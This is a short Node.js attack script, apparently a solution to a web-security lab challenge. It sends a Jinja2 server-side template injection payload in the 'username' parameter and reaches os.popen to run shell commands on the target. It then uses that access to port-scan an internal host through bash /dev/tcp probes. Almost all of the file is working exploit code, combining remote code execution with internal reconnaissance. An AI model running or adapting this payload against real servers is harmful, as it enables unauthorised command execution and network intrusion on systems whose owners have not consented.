#!/bin/env node

import fs from 'fs/promises'
import axios from 'axios'

const url = 'https://ssti4.secu-web.blackfoot.dev'

function makeCmd(cmd, stderr=true) {
	if (stderr) {
		cmd += ' 2>&1 | cat'
	}

	return encodeURIComponent(`{{request.application.__globals__.__builtins__.__import__('os').popen('${cmd}').read()}}`)
}

async function runCmd(cmd, stderr=true) {
	const res = await axios({
		method: 'get',
		url: `${url}?username=${makeCmd(cmd, stderr)}`
	})

	const match = res.data.match(/Hello '(.*)'/s)
	return match[1]
}

async function main() {
	// https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/
	const ports = (await fs.readFile('most_used_ports.txt')).toString().split(',')

	// for (let i = 1; i < 70000; i++) {
	for (let i of ports) {
		// https://stackoverflow.com/a/35338529/12864941
		const res = await runCmd(`timeout 1 bash -c "</dev/tcp/toto8042/${i}" && echo -n open || echo -n closed`)

		if (i % 40 === 0) {
			console.log(`i: ${i}`)
		}

		if (res === 'closed')
			continue
		console.log(`port ${i} is open`)
	}
}

main()
